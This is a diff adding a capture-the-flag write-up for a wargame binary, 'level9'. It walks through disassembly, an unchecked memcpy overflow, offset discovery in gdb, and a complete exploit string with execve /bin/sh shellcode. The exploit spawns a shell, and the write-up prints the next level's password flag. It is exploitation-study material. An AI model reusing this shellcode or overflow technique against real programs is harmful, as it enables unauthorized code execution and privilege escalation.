@@ -1,0 +1,53 @@
+8048677:	e8 92 00 00 00       	call   804870e <_ZN1N13setAnnotationEPc>
+ 804867c:	8b 44 24 10          	mov    0x10(%esp),%eax
+ 8048680:	8b 00                	mov    (%eax),%eax
+ 8048682:	8b 10                	mov    (%eax),%edx # Double dereference
+ 0x08048684 <+144>:	mov    0x14(%esp),%eax
+ 0x08048688 <+148>:	mov    %eax,0x4(%esp)
+ 0x0804868c <+152>:	mov    0x10(%esp),%eax
+ 0x08048690 <+156>:	mov    %eax,(%esp)
+ 0x08048693 <+159>:	call   *%edx # HERE IT'LL WILL THE FUNCTION IN edx
+ 
+ 0804870e <_ZN1N13setAnnotationEPc>:
+ 804870e:	55                   	push   %ebp
+ 804870f:	89 e5                	mov    %esp,%ebp
+ 8048711:	83 ec 18             	sub    $0x18,%esp
+ 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048717:	89 04 24             	mov    %eax,(%esp)
+ 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
+ 804871f:	8b 55 08             	mov    0x8(%ebp),%edx
+ 8048722:	83 c2 04             	add    $0x4,%edx
+ 8048725:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048730:	89 14 24             	mov    %edx,(%esp)
+ 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt> # Memcpy not overflow protected
+ 8048738:	c9                   	leave
+ 8048739:	c3                   	ret
+ 
+
+ 
+ > ltrace ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+strlen("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 150
+memcpy(0x0804a00c, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 150) = 0x0804a00c # We have buffer address
+ 
+ # We find the offset for eax (first arg)
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+(gdb) info register eax
+eax 0x41366441	1094083649
+ # So offset calculator give 108
+ 
+ # WHAT DA PAYLOAD DO: Overflow until we have reach eax content, we fill it with addr of what we cpy in memcpy, SO when the program run
+ when it arrive to main+159:	call   *%edx, eax content has been stored in edx, so the instrution <call *> will read edx 4 first bytes (adress poining to the shellcode)
+ and use it as a GOT pointer, so it will execute the code stored at the adresse we give in first to our payload
+ 
+ # DA PAYLOAD
+ "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"
+ [memcpy adress deref]+[shellcode level2 21 bytes]+[padding jusqua 108]+[addr buffer]
+ 
+ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"'
+> )
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
